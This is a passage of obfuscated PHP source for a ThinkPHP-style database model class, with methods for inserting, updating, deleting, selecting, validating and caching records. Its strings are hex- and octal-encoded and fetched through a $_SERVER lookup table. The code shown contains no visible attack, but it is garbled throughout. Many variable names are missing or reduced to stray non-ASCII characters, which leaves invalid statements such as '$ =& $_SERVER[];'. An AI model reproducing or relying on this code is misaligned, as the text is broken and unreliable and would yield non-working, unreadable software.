"\x6f\162\x64\x65\x72", "\x61\x6c\151\141\x73", "\150\x61\166\151\156\x67", "\147\162\157\x75\x70", "\154\x6f\x63\153", "\x64\x69\x73\x74\151\x6e\x63\164", "\x61\x75\164\x6f", "\146\151\154\x74\x65\x72", "\166\x61\154\x69\x64\141\x74\x65", "\x72\x65\x73\x75\x6c\x74", "\x62\151\156\x64", "\x74\x6f\x6b\145\156"); public function __construct($ = '', $ = '', $ = '') { $ =& $_SERVER[]; $this->_initialize(); if (!empty($)) { if (strpos($, $[10])) { list($this->dbName, $this->name) = explode($[10], $); } else { $this->name = $; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($)) { $this->tablePrefix = $[12]; } elseif ($[12] != $) { $this->tablePrefix = $; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($[321]); } $this->db(0, empty($this->connection) ? $ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ې =& $_SERVER[]; if (empty($this->fields)) { if (think_config($ې[322])) { $ = $this->dbName ? $this->dbName : think_config($ې[323]); $Ҹ = think_var_cache($ې[324] . strtolower(get_path_this($) . $ې[10] . $this->name)); if ($Ҹ) { $蹸Ը = think_config($ې[325]); if (empty($蹸Ը) || $Ҹ[$ې[326]] == $蹸Ը) { $this->fields = $Ҹ; return; } } } $this->flush(); } } public function flush() { $Үŕ =& $_SERVER[]; $this->db->setModel($this->name); $˿ = $this->db->getFields($this->getTableName()); if (!$˿) { return !1; } $this->fields = array_keys($˿); $this->fields[$Үŕ[327]] = !1; foreach ($˿ as $ => $⧛) { $̦[$] = $⧛[$Үŕ[33]]; if ($⧛[$Үŕ[39]]) { $this->fields[$Үŕ[328]] = $; if ($⧛[$Үŕ[42]]) { $this->fields[$Үŕ[327]] = !0; } } } $this->fields[$Үŕ[329]] = $̦; if (think_config($Үŕ[325])) { $this->fields[$Үŕ[326]] = think_config($Үŕ[325]); } if (think_config($Үŕ[322])) { $䬩 = $this->dbName ? $this->dbName : think_config($Үŕ[323]); think_var_cache($Үŕ[324] . strtolower(get_path_this($䬩) . $Үŕ[10] . $this->name), $this->fields); } } public function switchModel($, $ = array()) { $Å =& $_SERVER[]; $ʑ = ucwords(strtolower($)) . $Å[330]; if (!class_exists($ʑ)) { think_exception($ʑ . think_lang($Å[331])); } $this->_extModel = new $ʑ($this->name); if (!empty($)) { foreach ($ as $ԃ) { $this->_extModel->setProperty($ԃ, $this->{$ԃ}); } } return $this->_extModel; } public function __set($Ѩ, $) { $this->data[$Ѩ] = $; } public function __get($) { return isset($this->data[$]) ? $this->data[$] : null; } public function __isset($ٶ) { return isset($this->data[$ٶ]); } public function __unset($ޙ) { unset($this->data[$ޙ]); } public function __call($ͷ, $ɥ) { $ =& $_SERVER[]; if (in_array(strtolower($ͷ), $this->methods, !0)) { $this->options[strtolower($ͷ)] = $ɥ[0]; return $this; } elseif (in_array(strtolower($ͷ), array($[332], $[333], $[334], $[335], $[336]), !0)) { $ = isset($ɥ[0]) ? $ɥ[0] : $[220]; $ = $this->db->parseKey($); return $this->getField(strtoupper($ͷ) . $[337] . $ . $[338] . $ͷ, $[332]); } elseif (strtolower(substr($ͷ, 0, 5)) == $[339]) { $ = think_parse_name(substr($ͷ, 5)); $΋[$] = $ɥ[0]; return $this->where($΋)->find(); } elseif (strtolower(substr($ͷ, 0, 10)) == $[340]) { $ّ׊ = think_parse_name(substr($ͷ, 10)); $΋[$ّ׊] = $ɥ[0]; return $this->where($΋)->getField($ɥ[1]); } elseif (isset($this->_scope[$ͷ])) { return $this->scope($ͷ, $ɥ[0]); } elseif (method_exists($this, $ͷ) || method_exists($this, $[341] . $ͷ)) { array_unshift($ɥ, $ͷ); return call_user_func_array(array($this, $[342]), $ɥ); } else { return call_user_func_array(array(parent, $ͷ), $ɥ); } } protected function call() { $ =& $_SERVER[]; $؁ = func_get_args(); $˜ = array_shift($؁); $纇 = $˜; if (is_array($˜)) { $纇 = $˜[1]; $˜ = $˜[0]; } $㤬 = count($؁) - 1; if (isset($؁[$㤬]) && $؁[$㤬] === $˜) { think_exception(__CLASS__ . $[4] . $˜ . think_lang($[343])); return; } $؁[] = $˜; if (method_exists($this, $[344])) { $ԅ = call_user_func_array(array($this, $[345]), array($纇, $؁)); if (!is_null($ԅ) && $ԅ !== !1) { return $ԅ; } } $ņܷ = !1; if (method_exists($this, $˜)) { $ņܷ = call_user_func_array(array($this, $˜), $؁); } if (method_exists($this, $[346])) { $ԅ = call_user_func_array(array($this, $[347]), array($纇, $؁, $ņܷ)); if ($ԅ) { return $ԅ; } } return $ņܷ; } protected function _initialize() { } protected function _facade($¶٣) { $ =& $_SERVER[]; if (!empty($this->fields)) { foreach ($¶٣ as $ݧ => $̀) { if (is_array($this->fields) && !in_array($ݧ, $this->fields, !0)) { unset($¶٣[$ݧ]); } elseif (is_scalar($̀)) { $this->_parseType($¶٣, $ݧ); } } } if (!empty($this->options[$[348]])) { $¶٣ = array_map($this->options[$[348]], $¶٣); unset($this->options[$[348]]); } $this->_beforeWrite($¶٣); return $¶٣; } protected function _beforeWrite(&$´) { } public function add($ȸ = '', $ = array(), $ = false) { if (empty($ȸ)) { if (!empty($this->data)) { $ȸ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[][349]); return !1; } } $ = $this->_parseOptions($); $ȸ = $this->_facade($ȸ); if (!1 === $this->_beforeInsert($ȸ, $)) { return !1; } $衄 = $this->db->insert($ȸ, $, $); if (!1 !== $衄) { $鉨 = $this->getLastInsID(); if ($鉨) { $ȸ[$this->getPk()] = $鉨; $this->_after_insert($ȸ, $); return $鉨; } $this->_after_insert($ȸ, $); } return $衄; } protected function _beforeInsert(&$툚, $) { } protected function _after_insert($߆, $΀) { } public function addAll($, $ŉ = array(), $ʎǻ = false) { $ =& $_SERVER[]; if (empty($)) { $this->error = think_lang($[349]); return !1; } $ŉ = $this->_parseOptions($ŉ); foreach ($ as $ɂƈ => $݃) { $[$ɂƈ] = $this->_facade($݃); } if (method_exists($this->db, $[350])) { $ = $this->db->insertAll($, $ŉ, $ʎǻ); } else { $this->startTrans(); foreach ($ as $ɂƈ => $݃) { $ = $this->db->insert($݃, $ŉ, $ʎǻ); } $this->commit(); } if (!1 !== $) { $ = $this->getLastInsID(); if ($) { return $; } } return $; } public function selectAdd($׶⓿ = '', $͒ʭ = '', $Ƣ = array()) { $ =& $_SERVER[]; $Ƣ = $this->_parseOptions($Ƣ); if (!1 === ($˭ = $this->db->selectInsert($׶⓿ ? $׶⓿ : $Ƣ[$[351]], $͒ʭ ? $͒ʭ : $this->getTableName(), $Ƣ))) { $this->error = think_lang($[352]); return !1; } else { return $˭; } } public function save($ʃ = '', $䦚 = array()) { $ =& $_SERVER[]; if (empty($ʃ)) { if (!empty($this->data)) { $ʃ = $this->data; $this->data = array(); } else { $this->error = think_lang($[349]); return !1; } } $ʃ = $this->_facade($ʃ); $䦚 = $this->_parseOptions($䦚); $ڊ = $this->getPk(); if (!isset($䦚[$[353]])) { if (isset($ʃ[$ڊ])) { $[$ڊ] = $ʃ[$ڊ]; $䦚[$[353]] = $; unset($ʃ[$ڊ]); } else { $this->error = think_lang($[352]); return !1; } } if (is_array($䦚[$[353]]) && isset($䦚[$[353]][$ڊ])) { $ƒ = $䦚[$[353]][$ڊ]; } if (!1 === $this->_beforeUpdate($ʃ, $䦚)) { return !1; } $䦳 = $this->db->update($ʃ, $䦚); if (!1 !== $䦳) { if (isset($ƒ)) { $ʃ[$ڊ] = $ƒ; } $this->_afterUpdate($ʃ, $䦚); } return $䦳; } protected function _beforeUpdate(&$, $މ) { } protected function _afterUpdate($, $) { } public function delete($٦ = array()) { $뻚 =& $_SERVER[]; if (empty($٦) && empty($this->options[$뻚[353]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ɐ魟 = $this->getPk(); if (is_numeric($٦) || is_string($٦)) { if (strpos($٦, $뻚[50])) { $[$ɐ魟] = array($뻚[354], $٦); } else { $[$ɐ魟] = $٦; } $this->options[$뻚[353]] = $; } $٦ = $this->_parseOptions(); if (is_array($٦[$뻚[353]]) && isset($٦[$뻚[353]][$ɐ魟])) { $Ư = $٦[$뻚[353]][$ɐ魟]; } $Τ = $this->db->delete($٦); if (!1 !== $Τ) { $ą = array(); if (isset($Ư)) { $ą[$ɐ魟] = $Ư; } $this->_after_delete($ą, $٦); } return $Τ; } protected function _after_delete($, $ú) { } public function select($ = array()) { $ꂇ =& $_SERVER[]; if (is_string($) || is_numeric($)) { $ = $this->getPk(); if (strpos($, $ꂇ[50])) { $ԧ[$] = array($ꂇ[354], $); } else { $ԧ[$] = $; } $this->options[$ꂇ[353]] = $ԧ; } elseif (!1 === $) { $ = $this->_parseOptions(); return $ꂇ[355] . $this->db->buildSelectSql($) . $ꂇ[356]; } $ = $this->_parseOptions(); $ = $this->db->select($); if (!1 === $) { return !1; } if (empty($)) { return null; } $this->_afterSelect($, $); return $; } protected function _afterSelect(&$ʐ, $) { } public function buildSql($ = array()) { $ =& $_SERVER[]; $ = $this->_parseOptions($); return $[355] . $this->db->buildSelectSql($) . $[356]; } public function optionsValue($ = null) { if (is_null($)) { return $this->options; } elseif (is_array($)) { $this->options = array_merge($this->options, $); } } protected function _parseOptions($ݳ = array()) { $ۇ =& $_SERVER[]; if (is_array($ݳ)) { $ݳ = array_merge($this->options, $ݳ); } $this->options = array(); if (!isset($ݳ[$ۇ[357]])) { $ݳ[$ۇ[357]] = $this->getTableName(); $ = $this->fields; } else { $ = $this->getDbFields(); } if (!empty($ݳ[$ۇ[358]])) { $ݳ[$ۇ[357]] .= $ۇ[53] . $ݳ[$ۇ[358]]; } $ݳ[$ۇ[359]] = $this->name; if (isset($ݳ[$ۇ[353]]) && is_array($ݳ[$ۇ[353]]) && !empty($) && !isset($ݳ[$ۇ[360]]) && !isset($ݳ[$ۇ[357]])) { foreach ($ݳ[$ۇ[353]] as $ʔ => $ܠ) { $ʔ = trim($ʔ); if (in_array($ʔ, $, !0)) { if (is_scalar($ܠ)) { $this->_parseType($ݳ[$ۇ[353]], $ʔ); } } elseif (!is_numeric($ʔ) && $ۇ[11] != substr($ʔ, 0, 1) && !1 === strpos($ʔ, $ۇ[10]) && !1 === strpos($ʔ, $ۇ[337]) && !1 === strpos($ʔ, $ۇ[212]) && !1 === strpos($ʔ, $ۇ[284])) { unset($ݳ[$ۇ[353]][$ʔ]); } } } $this->_options_filter($ݳ); return $ݳ; } protected function _options_filter(&$ʈ) { } protected function _parseType(&$, $Ȫ) { $٭ӽ =& $_SERVER[]; if (empty($this->options[$٭ӽ[361]][$٭ӽ[4] . $Ȫ])) { $ = strtolower($this->fields[$٭ӽ[329]][$Ȫ]); if (!1 !== strpos($, $٭ӽ[362])) { } elseif (!1 === strpos($, $٭ӽ[363]) && !1 !== strpos($, $٭ӽ[364])) { $[$Ȫ] = intval($[$Ȫ]); } elseif (!1 !== strpos($, $٭ӽ[365]) || !1 !== strpos($, $٭ӽ[366])) { $[$Ȫ] = floatval($[$Ȫ]); } elseif (!1 !== strpos($, $٭ӽ[367])) { $[$Ȫ] = (bool) $[$Ȫ]; } } } public function find($ = array()) { $ =& $_SERVER[]; if (is_numeric($) || is_string($)) { $[$this->getPk()] = intval($); $this->options[$[353]] = $; } $this->options[$[368]] = 1; $ = $this->_parseOptions(); $̧ = $this->db->select($); if (!1 === $̧) { return !1; } if (empty($̧)) { return null; } $ = $̧[0]; $this->_afterFind($, $); return $; } protected function _afterFind(&$΋, $ܚ) { } protected function returnResult($, $ď = '') { $ޣ =& $_SERVER[]; if ($ď) { if (is_callable($ď)) { return call_user_func($ď, $); } switch (strtolower($ď)) { case $ޣ[369]: return json_encode($); case $ޣ[370]: return xml_encode($); } } return $; } public function parseFieldsMap($, $ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ԧ => $臓) { if ($ == 1) { if (isset($[$臓])) { $[$ԧ] = $[$臓]; unset($[$臓]); } } else { if (isset($[$ԧ])) { $[$臓] = $[$ԧ]; unset($[$ԧ]); } } } } return $; } public function setField($, $мΈ = '') { if (is_array($)) { $ˆ = $; } else { $ˆ[$] = $мΈ; } return $this->save($ˆ); } public function setAdd($ϯԀ, $릜 = 1) { $螣 =& $_SERVER[]; $쑖 = $ϯԀ . $螣[371] . $릜; if ($릜 < 0) { $쑖 = $ϯԀ . $릜; } return $this->setField($ϯԀ, array($螣[372], $쑖)); } public function getField($, $ = null) { $񦞛 =& $_SERVER[]; $[$񦞛[351]] = $; $ = $this->_parseOptions($); $ = trim($); if (strpos($, $񦞛[50])) { if (!isset($[$񦞛[368]])) { $[$񦞛[368]] = is_numeric($) ? $ : $񦞛[12]; } $ = $this->db->select($); if (!empty($)) { $ҕ = explode($񦞛[50], $); $ = array_keys($[0]); $׌ = array_shift($); $ͣ = array_shift($); $ = array(); $鋫 = count($ҕ); foreach ($ as $) { $˒ץ = $[$׌]; if (2 == $鋫) { $[$˒ץ] = $[$ͣ]; } else { $[$˒ץ] = is_string($) ? implode($, $) : $; } } return $; } } else { if (!0 !== $) { $[$񦞛[368]] = is_numeric($) ? $ : 1; } if ($ === $񦞛[332]) { unset($[$񦞛[368]]); } $ = $this->db->select($); if (!empty($)) { if ($ === $񦞛[332]) { return reset($[0]); } if (!0 !== $ && 1 == $[$񦞛[368]]) { return reset($[0]); } foreach ($ as $ҫ̂) { $[] = $ҫ̂[$]; } return $; } } return null; } public function create($̛ = '', $Ѝ = '') { $ =& $_SERVER[]; if (empty($̛)) { $̛ = $_POST; } elseif (is_object($̛)) { $̛ = get_object_vars($̛); } if (empty($̛) || !is_array($̛)) { $this->error = think_lang($[349]); return !1; } $̛ = $this->parseFieldsMap($̛, 0); $Ѝ = $Ѝ ? $Ѝ : (!empty($̛[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$[351]])) { $ = $this->options[$[351]]; unset($this->options[$[351]]); } elseif ($Ѝ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ = $this->insertFields; } elseif ($Ѝ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ = $this->updateFields; } if (isset($)) { if (is_string($)) { $ = explode($[50], $); } if (think_config($[373])) { $[] = think_config($[374]); } foreach ($̛ as $Ձ => $) { if (!in_array($Ձ, $)) { unset($̛[$Ձ]); } } } if (!$this->autoValidation($̛, $Ѝ)) { return !1; } if (!$this->autoCheckToken($̛)) { $this->error = think_lang($[375]); return !1; } if ($this->autoCheckFields) { $ = $this->getDbFields(); foreach ($̛ as $Ձ => $) { if (!in_array($Ձ, $)) { unset($̛[$Ձ]); } elseif (MAGIC_QUOTES_GPC && is_string($)) { $̛[$Ձ] = stripslashes($); } } } $this->autoOperation($̛, $Ѝ); $this->data = $̛; return $̛; } public function autoCheckToken($) { $梶 =& $_SERVER[]; if (isset($this->options[$梶[376]]) && !$this->options[$梶[376]]) { return !0; } if (think_config($梶[373])) { $΂ = think_config($梶[374]); if (!isset($[$΂]) || Session::get($΂)) { return !1; } list($, $ɀ) = explode($梶[11], $[$΂]); if ($ɀ && Session::get($΂ . $梶[10] . $) === $ɀ) { Session::remove($΂ . $梶[10] . $); return !0; } if (think_config($梶[377])) { Session::remove($΂ . $梶[10] . $); } return !1; } return !0; } public function regex($ѵР, $) { $ށ =& $_SERVER[]; $Ǥ = array($ށ[378] => $ށ[379], $ށ[380] => $ށ[381], $ށ[382] => $ށ[383], $ށ[384] => $ށ[385], $ށ[386] => $ށ[387], $ށ[388] => $ށ[389], $ށ[390] => $ށ[391], $ށ[366] => $ށ[392], $ށ[393] => $ށ[394]); if (isset($Ǥ[strtolower($)])) { $ = $Ǥ[strtolower($)]; } return preg_match($, $ѵР) === 1; } private function autoOperation(&$̭, $ׇ) { $ׁ =& $_SERVER[]; if (!empty($this->options[$ׁ[395]])) { $ί = $this->options[$ׁ[395]]; unset($this->options[$ׁ[395]]); } elseif (!empty($this->_auto)) { $ί = $this->_auto; } if (isset($ί)) { foreach ($ί as $홱) { if (empty($홱[2])) { $홱[2] = THINK_MODEL_INSERT; } if ($ׇ == $홱[2] || $홱[2] == THINK_MODEL_BOTH) { switch (trim($홱[3])) { case $ׁ[396]: case $ׁ[397]: $͑ = isset($홱[4]) ? (array) $홱[4] : array(); if (isset($̭[$홱[0]])) { array_unshift($͑, $̭[$홱[0]]); } if ($ׁ[396] == $홱[3]) { $̭[$홱[0]] = call_user_func_array($홱[1], $͑); } else { $̭[$홱[0]] = call_user_func_array(array(&$this, $홱[1]), $͑); } break; case $ׁ[351]: $̭[$홱[0]] = $̭[$홱[1]]; break; case $ׁ[398]: if ($ׁ[12] === $̭[$홱[0]]) { unset($̭[$홱[0]]); } break; case $ׁ[399]: default: $̭[$홱[0]] = $홱[1]; } if (!1 === $̭[$홱[0]]) { unset($̭[$홱[0]]); } } } } return $̭; } protected function autoValidation($, $Ӷ) { $ͬ =& $_SERVER[]; if (!empty($this->options[$ͬ[400]])) { $ڄ = $this->options[$ͬ[400]]; unset($this->options[$ͬ[400]]); } elseif (!empty($this->_validate)) { $ڄ = $this->_validate; } if (isset($ڄ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ڄ as $ټ => $) { if (empty($[5]) || $[5] == THINK_MODEL_BOTH || $[5] == $Ӷ) { if (0 == strpos($[2], $ͬ[401]) && strpos($[2], $ͬ[402])) { $[2] = think_lang(substr($[2], 2, -1)); } $[3] = isset($[3]) ? $[3] : THINK_EXISTS_VALIDATE; $[4] = isset($[4]) ? $[4] : $ͬ[403]; switch ($[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($, $)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ͬ[12] != trim($[$[0]])) { if (!1 === $this->_validationField($, $)) { return !1; } } break; default: if (isset($[$[0]])) { if (!1 === $this->_validationField($, $)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ť, $) { if (!1 === $this->_validationFieldItem($Ť, $)) { if ($this->patchValidate) { $this->error[$[0]] = $[2]; } else { $this->error = $[2]; return !1; } } return; } protected function _validationFieldItem($Ұ, $ȣ) { $ =& $_SERVER[]; switch (strtolower(trim($ȣ[4]))) { case $[396]: case $[397]: $ = isset($ȣ[6]) ? (array) $ȣ[6] : array(); if (is_string($ȣ[0]) && strpos($ȣ[0], $[50])) { $ȣ[0] = explode($[50], $ȣ[0]); } if (is_array($ȣ[0])) { foreach ($ȣ[0] as $) { $὞߸[$] = $Ұ[$]; } array_unshift($, $὞߸); } else { array_unshift($, $Ұ[$ȣ[0]]); } if ($[396] == $ȣ[4]) { return call_user_func_array($ȣ[1], $); } else { return call_user_func_array(array(&$this, $ȣ[1]), $); } case $[404]: return $Ұ[$ȣ[0]] == $Ұ[$ȣ[1]]; case $[405]: if (is_string($ȣ[0]) && strpos($ȣ[0], $[50])) { $ȣ[0] = explode($[50], $ȣ[0]); } $储 = array(); if (is_array($ȣ[0])) { foreach ($ȣ[0] as $) { $储[$] = $Ұ[$]; } } else { $储[$ȣ[0]] = $Ұ[$ȣ[0]]; } if (!empty($Ұ[$this->getPk()])) { $储[$this->getPk()] = array($[406], $Ұ[$this->getPk()]); } if ($this->where($储)->find()) { return !1; } return !0; default: return $this->check($Ұ[$ȣ[0]], $ȣ[1], $ȣ[4]); } } public function check($, $齔, $ = "\162\x65\x67\x65\x78") { $ =& $_SERVER[]; $ = strtolower(trim($)); switch ($) { case $[7]: case $[407]: $򭟋 = is_array($齔) ? $齔 : explode($[50], $齔); return $ == $[7] ? in_array($, $򭟋) : !in_array($, $򭟋); case $[408]: case $[409]: if (is_array($齔)) { $˦ = $齔[0]; $ҕ = $齔[1]; } else { list($˦, $ҕ) = explode($[50], $齔); } return $ == $[408] ? $ >= $˦ && $ <= $ҕ : $ < $˦ || $ > $ҕ; case $[410]: case $[411]: return $ == $[410] ? $ == $齔 : $ != $齔; case $[412]: $˴ = mb_strlen($, $[413]); if (strpos($齔, $[50])) { list($˦, $ҕ) = explode($[50], $齔); return $˴ >= $˦ && $˴ <= $ҕ; } else { return $˴ == $齔; } case $[414]: list($䟻, $) = explode($[50], $齔); if (!is_numeric($䟻)) { $䟻 = strtotime($䟻); } if (!is_numeric($)) { $ = strtotime($); } return NOW_TIME >= $䟻 && NOW_TIME <= $; case $[415]: return in_array(get_client_ip(), explode($[50], $齔)); case $[416]: return !in_array(get_client_ip(), explode($[50], $齔)); case $[403]: default: return $this->regex($, $齔); } } public function query($, $⅍ = false) { $܀ =& $_SERVER[]; if (!is_bool($⅍) && !is_array($⅍)) { $⅍ = func_get_args(); array_shift($⅍); } $ = str_replace(array($܀[285], $܀[417]), $܀[53], $); $ = $this->parseSql($, $⅍); return $this->db->query($); } public function execute($, $ю = false) { if (!is_bool($ю) && !is_array($ю)) { $ю = func_get_args(); array_shift($ю); } $ = $this->parseSql($, $ю); return $this->db->execute($); } protected function parseSql($魞, $) { $ =& $_SERVER[]; if (!0 === $) { $⺕ = $this->_parseOptions(); $魞 = $this->db->parseSql($魞, $⺕); } elseif (is_array($)) { $ = array_map(array($this->db, $[418]), $); $魞 = vsprintf($魞, $); } else { $魞 = strtr($魞, array($[419] => $this->getTableName(), $[420] => think_config($[321]))); } $this->db->setModel($this->name); return $魞; } public function db($ = '', $޳ = '', $Ȉ⬔ = array()) { $Ҷ =& $_SERVER[]; if ($Ҷ[12] === $ && $this->db) { return $this->db; } static $Ғ = array(); static $ = array(); if (!isset($[$]) || isset($[$]) && $޳ && $Ғ[$] != $޳) { if (!empty($޳) && is_string($޳) && !1 === strpos($޳, $Ҷ[8])) { $޳ = think_config($޳); } $ = think_guid($޳); $[$] = Db::getInstance($޳); } elseif (NULL === $޳) { $[$]->close(); unset($[$]); return; } if (!empty($Ȉ⬔)) { if (is_string($Ȉ⬔)) { parse_str($Ȉ⬔, $Ȉ⬔); } foreach ($Ȉ⬔ as $࣡ => $ǐǃ) { $this->setProperty($࣡, $ǐǃ); } } $Ғ[$] = $޳; $this->db = $[$]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $݋ܞ = get_class($this); if ($݋ܞ == $_SERVER[][421]) { return $this->name; } $this->name = substr($݋ܞ, 0, -5); } return $this->name; } public function getTableName() { $ =& $_SERVER[]; if (empty($this->trueTableName)) { $鹢 = !empty($this->tablePrefix) ? $this->tablePrefix : $[12]; if (!empty($this->tableName)) { $鹢 .= $this->tableName; } else { $鹢 .= think_parse_name($this->name); } $this->trueTableName = strtolower($鹢); } return (!empty($this->dbName) ? $this->dbName . $[10] : $[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Հ =& $_SERVER[]; return isset($this->fields[$Հ[328]]) ? $this->fields[$Հ[328]] : $this->pk; } public function getDbFields() { $ =& $_SERVER[]; if (isset($this->options[$[357]])) { $Ⴠ = $this->db->getFields($this->options[$[357]]); return $Ⴠ ? array_keys($Ⴠ) : !1; } if ($this->fields) { $Ⴠ = $this->fields; unset($Ⴠ[$[327]], $Ⴠ[$[328]], $Ⴠ[$[329]], $Ⴠ[$[326]]); return $Ⴠ; } return !1; } public function data($ = '') { $ =& $_SERVER[]; if ($[12] === $ && !empty($this->data)) { return $this->data; } if (is_object($)) { $ = get_object_vars($); } elseif (is_string($)) { parse_str($, $); } elseif (!is_array($)) { think_exception(think_lang($[349])); } $this->data = $; return $this; } public function join($) { $ח =& $_SERVER[]; if (is_array($)) { $this->options[$ח[360]] = $; } elseif (!empty($)) { $this->options[$ח[360]][] = $; } return $this; } public function union($Խ, $͇ = false) { $ =& $_SERVER[]; if (empty($Խ)) { return $this; } if ($͇) { $this->options[$[422]][$[423]] = !0; } if (is_object($Խ)) { $Խ = get_object_vars($Խ); } if (is_string($Խ)) { $ʢ = $Խ; } elseif (is_array($Խ)) { if (isset($Խ[0])) { $this->options[$[422]] = array_merge($this->options[$[422]], $Խ); return $this; } else { $ʢ = $Խ; } } else { think_exception(think_lang($[349])); } $this->options[$[422]][] = $ʢ; return $this; } public function cache($ = true, $ = null, $ = '') { $ =& $_SERVER[]; if (!1 !== $) { $this->options[$[424]] = array($[95] => $, $[414] => $, $[33] => $); } return $this; } public function field($, $ = false) { $Ϩ =& $_SERVER[]; if (!0 === $) { $ٲ = $this->getDbFields(); $ = $ٲ ? $ٲ : $Ϩ[220]; } elseif ($) { if (is_string($)) { $ = explode($Ϩ[50], $); } $ٲ = $this->getDbFields(); $ = $ٲ ? array_diff($ٲ, $) : $; } $this->options[$Ϩ[351]] = $; return $this; } public function scope($ = '', $׏ = NULL) { $ǂ =& $_SERVER[]; if ($ǂ[12] === $) { if (isset($this->_scope[$ǂ[37]])) { $瓺 = $this->_scope[$ǂ[37]]; } else { return $this; } } elseif (is_string($)) { $ؿι = explode($ǂ[50], $); $瓺 = array(); foreach ($ؿι as $ր) { if (!isset($this->_scope[$ր])) { continue; } $瓺 = array_merge($瓺, $this->_scope[$ր]); } if (!empty($׏) && is_array($׏)) { $瓺 = array_merge($瓺, $׏); } } elseif (is_array($)) { $瓺 = $; } if (is_array($瓺) && !empty($瓺)) { $this->options = array_merge($this->options, array_change_key_case($瓺)); } return $this; } public function where($, $Ғ = null) { $͐ =& $_SERVER[]; if (!is_null($Ғ) && is_string($)) { if (!is_array($Ғ)) { $Ғ = func_get_args(); array_shift($Ғ); } $Ғ = array_map(array($this->db, $͐[418]), $Ғ); $ = vsprintf($, $Ғ); } elseif (is_object($)) { $ = get_object_vars($); } elseif (is_array($)) { foreach ($ as $ => $îó) { if ((is_numeric($) || !$) && is_string($îó)) { if (strpos($îó, $͐[425]) === 0) { continue; } think_trace($͐[426], $͐[12], $͐[49]); die; } } } if (is_string($) && $͐[12] != $) { $ׯ = array(); $ׯ[$͐[427]] = $; $ = $ׯ; } if (isset($this->options[$͐[353]])) { $this->options[$͐[353]] = array_merge($this->options[$͐[353]], $); } else { $this->options[$͐[353]] = $; } return $this; } public function limit($ى, $߻ = null) { $ =& $_SERVER[]; $this->options[$[368]] = is_null($߻) ? $ى : $ى . $[50] . $߻; return $this; } public function page($, $愣 = null) { $ =& $_SERVER[]; $this->options[$[428]] = is_null($愣) ? $ : $ . $[50] . $愣; return $this; } public function comment($) { $this->options[$_SERVER[][429]] = $; return $this; } public function setProperty($پ, $뮢) { if (property_exists($this, $پ)) { $this->{$پ} = $뮢; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\124\151\155\145", "\164\151\x6d\x65", "\x69\156\163\x65\162\164\54\x75\160\x64\x61\164\x65", "\146\x75\156\x63\x74\151\x6f\156"), array("\x63\x72\145\141\164\145\124\151\155\x65", "\x74\x69\155\x65", "\x69\156\163\x65\162\164", "\146\165\156\143\x74\151\x6f\156")); public function setDataAuto($) { $this->dataAuto = $; } public function __construct($ = '', $ܺ = '', $ = '') { parent::__construct($, $ܺ, $); } protected $tableMeta = array(); protected function _beforeInsert(&$󙲤, $ڑ) { $Ɔ =& $_SERVER[]; if (!$this->checkDataAutoHas($Ɔ[430])) { return; } $this->dataBeforeFilter($󙲤, $Ɔ[430]); } protected function _beforeUpdate(&$ƺ, $) { $ʚ =& $_SERVER[]; if (!$this->checkDataAutoHas($ʚ[431])) { return; } $this->dataBeforeFilter($ƺ, $ʚ[431]); } protected function _afterSelect(&$ݍ, $Ń) { if (!is_array($ݍ)) { return; } if (!$this->checkDataAutoHas($_SERVER[][432])) { return; } foreach ($ݍ as &$ᤣ) { $this->dataAfterFilter($ᤣ); } unset($ᤣ); } protected function _afterFind(&$ׁ, $⺳) { if (!is_array($ׁ)) { return; } if (!$this->checkDataAutoHas($_SERVER[][432])) { return; } $this->dataAfterFilter($ׁ); } public static function textEncode($Ǡ) { if (!$Ǡ) { return $Ǡ; } $ = json_encode($Ǡ); $ = preg_replace_callback($_SERVER[][433], function ($ۄ) { return addslashes($ۄ[0]); }, $); return json_decode($); } public static function textDecode($ս) { $ӝ¥ =& $_SERVER[]; if (!$ս) { return $ս; } $ӗ = json_encode($ս); $ӗ = preg_replace_callback($ӝ¥[434], function ($܂) { return $_SERVER[][97]; }, $ӗ); return json_decode($ӗ); } public function setAutoIncrement($¸ٲ) { $݈ = array($this->getPk() => $¸ٲ); $ڧ = $this->data($݈)->add(); if ($ڧ) { $this->delete($ڧ); } } public function getAutoIncrement() { $ = $this->getTableName(); $ë = $this->max($this->getPk()); $ = $this->query("\x73\150\157\167\x20\164\x61\x62\x6c\145\x20\163\x74\141\164\165\x73\40\x77\x68\x65\x72\x65\x20\x4e\141\155\145\x3d\x27{$}\x27"); $ၿ = $[0][$_SERVER[][435]]; $ = max($ë, $ၿ); return $; } protected function _callBefore($, $ѯ) { return $this->cacheCallCheck($, $ѯ, !1); } protected function _callAfter($骗ҽ, $) { return $this->cacheCallCheck($骗ҽ, $, !0); } protected function cacheFunctionAlias($ƚͪ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($پǂ, $, $ = false) { $ʕ =& $_SERVER[]; $Ȝ = $this->cacheFunctionAlias($); if (!$Ȝ) { return; } foreach ($Ȝ as $ => $̎) { $ֹ = $̎[0]; $ = explode($ʕ[50], $̎[1]); $랮 = isset($̎[2]) ? $̎[2] : 